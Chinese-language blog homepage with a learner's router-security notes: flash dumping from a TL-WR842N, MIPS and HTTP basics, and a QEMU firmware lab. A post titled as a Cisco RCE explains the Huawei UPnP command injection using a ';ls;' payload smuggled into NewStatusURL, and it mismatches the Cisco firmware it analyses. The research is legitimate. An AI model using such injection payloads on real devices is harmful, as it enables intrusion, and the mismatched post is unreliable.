<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.2/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"xiaosolll.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.2.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
  </script>
<meta property="og:type" content="website">
<meta property="og:title" content="Antinomy">
<meta property="og:url" content="https://xiaosolll.github.io/index.html">
<meta property="og:site_name" content="Antinomy">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="eetan">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://xiaosolll.github.io/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>
<title>Antinomy</title>
  




  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Antinomy</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">eetan</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">26</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2022/01/26/TL-WR842N%E6%8B%86%E5%8D%B8%E5%8F%8A%E5%85%B6%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/01/26/TL-WR842N%E6%8B%86%E5%8D%B8%E5%8F%8A%E5%85%B6%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/" class="post-title-link" itemprop="url">TL_WR842N拆卸及其固件提取</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-01-26 20:02:30 / Modified: 21:32:52" itemprop="dateCreated datePublished" datetime="2022-01-26T20:02:30+08:00">2022-01-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="路由器型号及其拆卸"><a href="#路由器型号及其拆卸" class="headerlink" title="路由器型号及其拆卸"></a>路由器型号及其拆卸</h2><p>型号：TL_WR842N version 4.1</p>
<p>拆卸步骤：将背面的两颗螺丝拧开，再大力沿着边沿将路由器撬开。</p>
<p><img src="https://i.imgur.com/uF9Sbnr.png"></p>
<p><img src="https://i.imgur.com/Ztej0mA.jpeg"></p>
<p><img src="https://i.imgur.com/2UFKZIj.png"></p>
<p>可以看到flash为：cfeon f80-100hcp,在编程器中为EN25F80。</p>
<h2 id="免拆提取固件"><a href="#免拆提取固件" class="headerlink" title="免拆提取固件"></a>免拆提取固件</h2><h3 id="准备工具："><a href="#准备工具：" class="headerlink" title="准备工具："></a>准备工具：</h3><p>1.芯片测试夹/烧录夹</p>
<p>2.夹子转换板</p>
<p>3.ch31A编程器</p>
<p><img src="https://i.imgur.com/uZj5rUG.png"></p>
<p>注意的点：</p>
<p>1.芯片测试夹的红线分别是在芯片的1号脚和转换板的一号脚</p>
<p>2.芯片的一号脚处有个小圆点供分辨</p>
<p>3.编程器的拉杆竖直状态为断开，平行于底部为连接。</p>
<p>最终的连接效果如下图：</p>
<p>【图一】</p>
<p><img src="https://i.imgur.com/PKZG5Ko.jpeg"></p>
<p>【图二】</p>
<p><img src="https://i.imgur.com/2u0CV1Y.png"></p>
<p>【图三】白色圆点所在位置为1号脚</p>
<p><img src="https://i.imgur.com/NbpiFzZ.png"></p>
<h3 id="提取步骤："><a href="#提取步骤：" class="headerlink" title="提取步骤："></a>提取步骤：</h3><p><strong>首先</strong>把芯片测试夹的尾端与夹子转换板连接在一起，注意红线与一号脚对应。</p>
<p><strong>其次</strong>将架子转换板的背面夹在编程器上，注意一脚对应的位置和路由器flash型号是25系列的。加好后将编程器插入电脑的usb接口。可以发现电源灯亮起为红色。</p>
<p><strong>接下来</strong>将芯片测试夹夹住芯片，如果成功夹好则路由器芯片一排灯会全部亮起，过一两秒只留下一个亮灯，而编程器的读写灯也会亮起一两秒。</p>
<p>编程器驱动可以在官网下载，驱动成功后就能打开编程器。</p>
<p><img src="https://i.imgur.com/FogHokB.png"></p>
<p>先预备setup，驱动成功则下面一个正式安装。</p>
<h3 id="编程器软件"><a href="#编程器软件" class="headerlink" title="编程器软件"></a>编程器软件</h3><p><img src="https://i.imgur.com/4FtGsOc.png"></p>
<h4 id="【–成功连接右下角有‘已连接’】"><a href="#【–成功连接右下角有‘已连接’】" class="headerlink" title="【–成功连接右下角有‘已连接’】"></a>【–成功连接右下角有‘已连接’】</h4><p><img src="https://i.imgur.com/ROD2y1I.png"></p>
<h4 id="【–按照类型厂商名称查找并且检测】"><a href="#【–按照类型厂商名称查找并且检测】" class="headerlink" title="【–按照类型厂商名称查找并且检测】"></a>【–按照类型厂商名称查找并且检测】</h4><blockquote>
<p>现象：检测开始路由器上的亮灯闪烁。</p>
</blockquote>
<p>如果后四位全部是FF则代表接触失败，需要重新调整芯片测试夹或者前面的步骤是否有误。</p>
<p><img src="https://i.imgur.com/AFnvtan.png"></p>
<h4 id="【–读取】"><a href="#【–读取】" class="headerlink" title="【–读取】"></a>【–读取】</h4><p>单击读取则会将flash里面的内容读出，然后保存下来就是我们常用的bin文件了。</p>
<p><img src="https://i.imgur.com/9Lkg5rQ.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/12/26/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-01/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/12/26/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-01/" class="post-title-link" itemprop="url">路由器漏洞挖掘_01</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-12-26 18:00:08" itemprop="dateCreated datePublished" datetime="2021-12-26T18:00:08+08:00">2021-12-26</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-12-30 20:43:11" itemprop="dateModified" datetime="2021-12-30T20:43:11+08:00">2021-12-30</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>,</p>
<h2 id="路由器基础"><a href="#路由器基础" class="headerlink" title="路由器基础"></a>路由器基础</h2><p>路由器很多是基于linux，路由器的linux系统有两个特点，一个是指令架构多采用MIPS和ARM这两种指令架构。二是路由器的shell是基于busybox的。</p>
<blockquote>
<p>mips:risc精简指令集，普遍用于小型设备的处理器架构。</p>
<p>路由器的根文件系统与linux系统基本上是一致的，根文件系统下通常有usr、sys、proc、lib、etc、bin、var、tmp、sbin、mnt、include、home及其dev目录。</p>
<p>bin、sbin及其usr目录下的bin和usr目录下的bin、sbin：都是用于存方路由器中的应用程序的目录。</p>
<p>lib和usr目录下的lib：是用于存放程序运行时需要的动态库文件的目录。</p>
<p>etc目录：用于存放路由器配置文件，比如程序自启动配置文件、脚本文件及其各种服务程序的配置文件，比如web服务器的配置文件。</p>
<p>busybox：在路由器系统中支持的shell都指向busybox的符号链接。（busybox –help）</p>
</blockquote>
<p>在路由器安全研究中常用的文本编辑器：nano编辑器、vi编辑器</p>
<p>编译工具gcc</p>
<p>调试工具gdb</p>
<h3 id="mips汇编语言"><a href="#mips汇编语言" class="headerlink" title="mips汇编语言"></a>mips汇编语言</h3><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>通用寄存器、特殊寄存器</p>
<h4 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h4><p>数据在存储器中是按照字节存放，处理器也按照字节访问存储器中的指令或者数据。</p>
<h4 id="mips寻址方式"><a href="#mips寻址方式" class="headerlink" title="mips寻址方式"></a>mips寻址方式</h4><p>寄存器寻址</p>
<p>立即数寻址</p>
<p>寄存器相对寻址：主要用于加载、存储指令使用</p>
<p>pc相对寻址：主要被转移指令使用</p>
<p><img src="https://i.imgur.com/r5U6te7.png"></p>
<h4 id="mips指令集特点"><a href="#mips指令集特点" class="headerlink" title="mips指令集特点"></a>mips指令集特点</h4><p>1.mips固定4字节指令长度</p>
<p>2.mips默认不把子函数的返回地址存放到栈中，而是存放在$31（$ra）寄存器中，这对叶子函数有利，对于嵌套函数，会有其他机制处理。</p>
<p>3.流水线效应，一个最重要的效应就是分支延迟效应。</p>
<blockquote>
<p>在分支跳转语句后面的那条语句叫做分支延迟槽。。。</p>
</blockquote>
<h4 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h4><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><h4 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h4><p>http请求由3部分组成：请求行、消息报头、请求正文</p>
<h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4><p>method request-URI HTTP-version CRLF</p>
<p>method：请求方法</p>
<blockquote>
<p>GET、POST、HEAD、PUT、DELETE、TRACE、CONNECT、OPTIONS</p>
<p>get方法提交的数据作为url请求的一部分出现，不能用于提交大量数据</p>
<p>post方法不会作为url请求的一部分，而是作为标准数据传送给web服务器。</p>
</blockquote>
<p>request-URI：统一资源标识符</p>
<p>http-version：标识请求的http协议版本</p>
<p>crlf：标识回车和换行</p>
<h4 id="消息报头"><a href="#消息报头" class="headerlink" title="消息报头"></a>消息报头</h4><p>http消息由客户端到服务器的请求+服务器到客户端的响应组成。也就是包括了请求消息和响应消息。</p>
<h5 id="请求消息报头"><a href="#请求消息报头" class="headerlink" title="请求消息报头"></a>请求消息报头</h5><p>名字+：+空格+值</p>
<p>accept：</p>
<blockquote>
<p>accept:image/gif   表明客户端希望接受GIF图像格式的资源</p>
<p>accept:text/html  表明客户端希望接受html文本</p>
</blockquote>
<p>accept-encoding</p>
<blockquote>
<p>accept-encoding:gzip.deflate   指定可接受的内容编码</p>
<p>如果没有设置这个域标识服务器假定客户端可以接受各种语言的编码</p>
</blockquote>
<p>cookie</p>
<blockquote>
<p>cookie:YWRtaW46YMRtaW4=  用于客户端向服务器提交cookie信息验证</p>
</blockquote>
<p>accept-language</p>
<blockquote>
<p>accept-language：zh-cn  用于指定一种自然语言</p>
</blockquote>
<p>authorization</p>
<blockquote>
<p>主要用于证明客户端有权查看某个资源</p>
</blockquote>
<p>host</p>
<blockquote>
<p>主要用于指定被请求资源的internet主机和端口号，通常从http url中提取出来。</p>
<p>比如“<a target="_blank" rel="noopener" href="http://www.baidu.com/index.html%E2%80%9D">http://www.baidu.com/index.html”</a></p>
<p>其host请求报头域：HOST：<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>  这里默认端口号为80</p>
<p>如果指定端口号：host： <a href="http://www.baidu.com:指定端口号">www.baidu.com:指定端口号</a></p>
</blockquote>
<p>user-agent</p>
<blockquote>
<p>它允许客户端将自己的操作系统、浏览器和其他属性高速服务器。</p>
</blockquote>
<h4 id="http协议请求正文"><a href="#http协议请求正文" class="headerlink" title="http协议请求正文"></a>http协议请求正文</h4><p>请求头和请求正文之间是一个空行，空行表示请求头已经结束，接下来的内容是请求正文。</p>
<p>请求正文中可以包含客户提交的查询字符串信息。</p>
<h3 id="ida的mips插件和脚本：p52"><a href="#ida的mips插件和脚本：p52" class="headerlink" title="ida的mips插件和脚本：p52"></a>ida的mips插件和脚本：p52</h3><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p>-h</p>
<p>–help</p>
<p>-e  提取文件</p>
<p>-M 根据扫描结果进行递归提取，仅对-e和–dd选项有效</p>
<p>脚本—IDC语言、python</p>
<p><img src="https://i.imgur.com/KdSaeXO.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/11/02/cisco-router%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/02/cisco-router%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">cisco_router远程代码执行漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-11-02 14:06:55" itemprop="dateCreated datePublished" datetime="2021-11-02T14:06:55+08:00">2021-11-02</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-11-06 17:11:25" itemprop="dateModified" datetime="2021-11-06T17:11:25+08:00">2021-11-06</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><h2 id="环境布置"><a href="#环境布置" class="headerlink" title="环境布置"></a>环境布置</h2><h3 id="binwalk安装于ubuntu20-04"><a href="#binwalk安装于ubuntu20-04" class="headerlink" title="binwalk安装于ubuntu20.04"></a>binwalk安装于ubuntu20.04</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;devttys0&#x2F;binwalk.git</span><br><span class="line">cd binwalk</span><br><span class="line">sudo python setup.py install</span><br><span class="line">sudo .&#x2F;deps.sh</span><br></pre></td></tr></table></figure>
<blockquote>
<p>把deps.sh的https全部改成git</p>
<p>注意master与git中间需要含有空格</p>
</blockquote>
<h3 id="qemu-16-04"><a href="#qemu-16-04" class="headerlink" title="qemu 16.04"></a>qemu 16.04</h3><blockquote>
<p>略</p>
</blockquote>
<h2 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h2><blockquote>
<p>binwalk -Me RV130X_FW_1.0.3.44.BIN</p>
</blockquote>
<p><img src="https://i.imgur.com/oMCLYPK.png"></p>
<blockquote>
<p>-M:递归扫描提取的文件</p>
<p>-e：自动提取已知文件类型</p>
</blockquote>
<p><img src="https://i.imgur.com/M7XpFWQ.png"></p>
<p>文件系统为Squashfs </p>
<p>采用little endian存储</p>
<p>其内核为：<img src="https://i.imgur.com/133hP1d.png"></p>
<p><img src="https://i.imgur.com/MH63bjt.png"></p>
<blockquote>
<p>处理http请求的底层文件</p>
</blockquote>
<h2 id="预备"><a href="#预备" class="headerlink" title="预备"></a>预备</h2><p>路由器系统类型：嵌入式linux系统、vxworks系统</p>
<p>文件系统类型：squashfs(最常见)、cpio、jffs2</p>
<h2 id="搭建路由器固件运行环境"><a href="#搭建路由器固件运行环境" class="headerlink" title="搭建路由器固件运行环境"></a>搭建路由器固件运行环境</h2><blockquote>
<p>qemu虚拟机</p>
<p>配置网络环境</p>
<p>加载路由器虚拟机的操作系统镜像</p>
</blockquote>
<h3 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h3><p>目的：使得qemu虚拟机和我们的ubuntu互通</p>
<p>安装网络配置工具：apt-get install bridge-utils uml-utilities</p>
<p>修改ubuntu网络配置文件： /etc/network/interfaces/</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># interfaces(5) file used by ifup(8) and ifdown(8)</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet manual</span><br><span class="line">up ifconfig ens33 0.0.0.0 up</span><br><span class="line"> </span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line"> </span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_maxwait 0</span><br></pre></td></tr></table></figure>
<p>创建或修改qemu网络接口启动文件脚本：(/etc/qemu-ifup)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"># Script to bring a network (tap) device for qemu up.</span><br><span class="line"># The idea is to add the tap device to the same bridge</span><br><span class="line"># as we have default routing to.</span><br><span class="line"> </span><br><span class="line"># in order to be able to find brctl</span><br><span class="line">echo &quot;Executing &#x2F;etc&#x2F;qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing $1 for bridge mode...&quot;</span><br><span class="line">sudo &#x2F;sbin&#x2F;ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0...&quot;</span><br><span class="line">sudo &#x2F;sbin&#x2F;brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure>
<p>使得配置生效：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">启动桥接网络赋予可执行权限</span></span><br><span class="line">sudo chmod a+x /etc/qemu-ifup</span><br><span class="line"><span class="meta">#</span><span class="bash">重启网络服务，使配置生效（注意这个地方配置正常之后，如果你是mac，可能会让你输入mac密码，windows我不知道）</span></span><br><span class="line">sudo /etc/init.d/networking restart</span><br><span class="line"><span class="meta">#</span><span class="bash">关闭ens33，启动桥接网络br0（这里如果显示eth0不存在没关系，直接启动br0）</span></span><br><span class="line">sudo ifdown eth0</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure>


<h3 id="配置qemu虚拟机"><a href="#配置qemu虚拟机" class="headerlink" title="配置qemu虚拟机"></a>配置qemu虚拟机</h3><p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a>   下载</p>
<p><img src="https://i.imgur.com/3dfSr7p.png"></p>
<p>第一个和第三个</p>
<p>在下载下来的文件处开启qemu</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic,macaddr=00:16:3e:00:00:01 -net tap</span><br></pre></td></tr></table></figure>
<p>账号密码都是root</p>
<p>ping  主机不通则修改网络配置：/etc/network/interfaces</p>
<p>用nano修改：nano /etc/network/interfaces</p>
<p>将默认的eth0改成eth1。</p>
<blockquote>
<p>ifconfig可以发现使用的网卡是eth1，所以需要更改</p>
</blockquote>
<p>重启eth1：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifup eth1</span><br></pre></td></tr></table></figure>




<p>可以在ubuntu中用ssh远程连接qemu虚拟机</p>
<blockquote>
<p>ssh root@虚拟机ip</p>
</blockquote>
<p>在ubuntu中另起终端将binwalk解压出来的文件系统拷贝到qemu</p>
<blockquote>
<p>scp -r ./squashfs-root  root@虚拟机ip:/root/</p>
</blockquote>
<p>ssh连接上的qemu虚拟机下，切换根目录到拷贝文件：</p>
<blockquote>
<p>chroot /root/squashfs-root /bin/sh</p>
</blockquote>
<p>然后先后运行upnp和mic</p>
<blockquote>
<p>upnp</p>
<p>mic</p>
</blockquote>
<p>mic 会久一点，直到</p>
<p>unable to open device /dev/bhal  就能回车看到login</p>
<p>再开一个终端查看是否能连接上upnp端口</p>
<blockquote>
<p>nc -vv qemu虚拟机ip 37215</p>
</blockquote>
<p>如果succeeded就可以跑exp了。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>华为家庭网关采用 UPnP 协议。通过 tr-064技术报告标准，该协议被广泛应用于嵌入式设备中，以实现家庭和企业环境中网络的无缝连接和简化实现。</p>
<p>TR-064是为本地网络配置而设计的。例如，它允许工程师从内部网络实现基本的设备配置、固件升级等。</p>
<p>在这种情况下，在华为设备中的TR-064实现是通过端口37215(UPnP)暴露给广域网的。</p>
<p>从设备的 UPnP 描述中可以看出，它支持一种名为 DeviceUpgrade 的服务类型。该服务通过发送请求到“/ctrl/DeviceUpgrade _ 1”(称为 controlURL)来执行固件升级操作，并使用两个元素 NewStatusURL 和 NewDownloadURL 来执行。</p>
<p><img src="https://i.imgur.com/7AYATtf.png"></p>
<p>看到这里就可以看清楚漏洞的原理了，具体来说是首先在<code>&lt;NewStatusURL&gt;</code>输入分号将前面的字符串闭合，然后再注入相应的执行命令即可，如需要执行<code>ls</code>命令，则需要做的就是构造<code>&lt;NewStatusURL&gt;&#39;;ls;&lt;/NewStatusURL&gt;</code>节点即可。该节点字符串与<code>upg -g -U %s -t &#39;1 Firmware Upgrade Image&#39; -c upnp -r %s -d -</code>拼接得到<code>upg -g -U %s -t &#39;1 Firmware Upgrade Image&#39; -c upnp -r &#39;;ls; -d -</code>，然后执行system调用，实现注入。</p>
<p><img src="https://i.imgur.com/joy2NYU.png"></p>
<h2 id="处理原数据"><a href="#处理原数据" class="headerlink" title="处理原数据"></a>处理原数据</h2><p>DeviceUpgrade服务</p>
<p>引用了etc/upnp目录下的DevUpg.xml文件</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/340161208">https://zhuanlan.zhihu.com/p/340161208</a>   </p>
<p><a target="_blank" rel="noopener" href="http://ronpa.top/2018/11/29/CVE-2017-17215%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://ronpa.top/2018/11/29/CVE-2017-17215%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/490/">https://paper.seebug.org/490/</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269188.htm">https://bbs.pediy.com/thread-269188.htm</a>   system的参数来源</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>1.<a target="_blank" rel="noopener" href="https://prowes5.github.io/2019/07/21/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">https://prowes5.github.io/2019/07/21/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</a>    路由器漏洞环境布置</p>
<p>2.<a target="_blank" rel="noopener" href="https://paper.seebug.org/1039/">https://paper.seebug.org/1039/</a>   CVE-2019-1663堆栈缓冲区溢出漏洞</p>
<p>3.<a target="_blank" rel="noopener" href="https://software.cisco.com/download/home/285026142/type/282465789/release/1.0.3.44">https://software.cisco.com/download/home/285026142/type/282465789/release/1.0.3.44</a>   思科固件下载</p>
<p>4.<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-268758.htm">https://bbs.pediy.com/thread-268758.htm</a>   Cisco RV160W系列路由器漏洞/</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/10/09/xv61/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

